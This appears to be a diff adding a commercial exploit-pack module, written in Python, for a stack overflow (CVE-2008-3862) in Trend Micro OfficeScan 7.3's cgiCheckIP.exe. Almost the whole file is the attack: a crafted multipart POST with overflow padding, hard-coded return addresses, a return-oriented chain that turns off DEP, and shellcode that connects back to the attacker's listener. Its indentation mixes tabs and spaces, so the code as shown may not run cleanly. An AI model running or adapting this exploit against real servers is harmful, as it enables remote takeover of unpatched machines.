@@ -1,0 +1,196 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Trend Micro OfficeScan 7.3 CGI Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack overflow vulnerability in Trend Micro OfficeScan 7.3 CGI"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2008.10.22"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/31859"
+DOCUMENTATION["Versions Affected"] = "Trend Micro OfficeScan 7.3"
+DOCUMENTATION["CVE Name"] = "CVE-2008-3862"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3862"
+
+VERSION = "1.0"
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+
+targets = {    
+    0: ['Windows 2000 SP0-SP4 / Windows 2003 SP0',  0x00401071],  # pop, pop, retn @ cgiCheckIP.exe 
+    1: ['Windows 2003 SP1/SP2 (DEP)', 0x0040bb23],                # add esp, ret @ cgiCheckIP.exe 
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.port = 4343
+        self.host = ""                                
+        self.name = NAME   
+        self.badstring = "\x00\x0a\x0d"     
+        self.subesp = 1000
+        return
+
+        
+    def neededListenerTypes(self):
+				return [canvasengine.WIN32MOSDEF]
+		
+				
+    def createShellcode(self):
+        return self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
+						
+				    
+    def run(self):	    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        try:            
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.host, self.port))
+            sslSocket = socket.ssl(s)
+            sslSocket.write(sploitstring)
+        except:            
+            self.log("Attack reported no open socket - service died?")
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+        
+        return 1
+        
+        
+    def makesploit(self):
+        """
+        Construct the attack        			  
+				
+				"""        								
+				
+				# Windows 2003 SP1/SP2
+        if (self.version == 1): 
+					os_name, add_esp = targets[self.version]
+				  					
+					data = "POST /officescan/cgi/cgiCheckIP.exe HTTP/1.0\r\nHost: " + self.host + "\r\nContent-type: multipart/form-data, boundary=---------------------------144131664119855\r\nContent-Length: LENGTH\r\n\r\n"
+					body = "-----------------------------144131664119855\r\nContent-Disposition: form-data; name=\"textline\"\r\n\r\nBUFF\r\n-----------------------------144131664119855--\r\n"
+					
+					ret = struct.pack('<L', add_esp)					
+					jmp = "\x90\x90\xeb\x06"
+										
+					data_1 = "\x90" * 713
+					
+					# anti-dep, jmp esp										
+					inst1 = struct.pack('<L', 0x0041216c) # pop eax @ cgiCheckIP.exe
+					inst2 = struct.pack('<L', 0x636026ff) # pop edx @ loadhttp.dll
+					inst3 = struct.pack('<L', 0x00425d0a) # call dword ptr [edx] @ cgiCheckIP.exe
+					inst4 = struct.pack('<L', 0x00401c97) # add esp, 18	@ cgiCheckIP.exe		
+					inst5 = struct.pack('<L', 0x63604e64) # push esp, ret @ loadhttp.dll
+					
+					# ZwSetInformationProcess(-1, 22, 2, 4) 
+					val1 = struct.pack('<L', 0xed)       # eax == 0xed
+					val2 = struct.pack('<L', 0x7ffe0300) # edx == 0x7ffe0300
+										
+					val3 = struct.pack('<L', 0xffffffff)
+					val4 = struct.pack('<L', 0x22)
+					val5 = struct.pack('<L', 0x7ffe0270) # 2
+					val6 = struct.pack('<L', 0x4)
+					
+					val7 = struct.pack('<L', 0x00460000) # data section @ cgiCheckIP.exe
+										
+					bla = inst2 + val2 + inst1 + val1 + inst3 + inst4 + val3 + val4 + val5 + val6 + "\xff\xff\xff\xff" + "\xff\xff\xff\xff" + inst1 + val7 + inst5
+										
+					data_3 = "A"* (2188 - len (bla) + 4)
+					tmp = data_3[0:12]
+					tmp += self.shellcode
+					tmp += data_3[12 + len(self.shellcode):]	
+					
+					data_2 = "A"*980 + bla + tmp
+
+					tmp = data_1[0:12]
+					tmp += self.shellcode
+					tmp += data_1[12 + len(self.shellcode):]	
+										
+					body = body.replace("BUFF", data_2 + jmp + ret + tmp)
+					body += "\r\n\r\n-----------------------------144131664119855\r\nContent-Disposition: form-data; filename=\"textline.txt\"\r\n\r\nBLA" + "\r\n-----------------------------144131664119855--\r\n"
+					data = data.replace("LENGTH", str(len(body)))
+					data = data + body				
+				
+				
+				# Windows 2000 / Windows 2003 SP0
+        else:                   
+					os_name, pop_pop_ret = targets[self.version]
+														
+					data = "POST /officescan/cgi/cgiCheckIP.exe HTTP/1.0\r\nHost: " + self.host + "\r\nContent-type: multipart/form-data, boundary=---------------------------144131664119855\r\nContent-Length: LENGTH\r\n\r\n"
+					body = "-----------------------------144131664119855\r\nContent-Disposition: form-data; name=\"textline\"\r\n\r\nBUFF\r\n-----------------------------144131664119855--\r\n"
+					
+					ret = struct.pack('<L', pop_pop_ret)								
+					jmp = "\x90\x90\xeb\x06"
+										
+					data_1 = "\x90" * 713
+					data_2 = "A" * 3172
+
+					tmp = data_1[0:12]
+					tmp += self.shellcode
+					tmp += data_1[12 + len(self.shellcode):]	
+										
+					body = body.replace("BUFF", data_2 + jmp + ret + tmp)
+					body += "\r\n\r\n-----------------------------144131664119855\r\nContent-Disposition: form-data; filename=\"textline.txt\"\r\n\r\nBLA" + "\r\n-----------------------------144131664119855--\r\n"
+					data = data.replace("LENGTH", str(len(body)))
+					data = data + body
+        	
+        return data
+        
+        
+    def usage(self):
+        print 'Usage: %s -v version -t host -l localIP -d localPort'%(sys.argv[0])
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
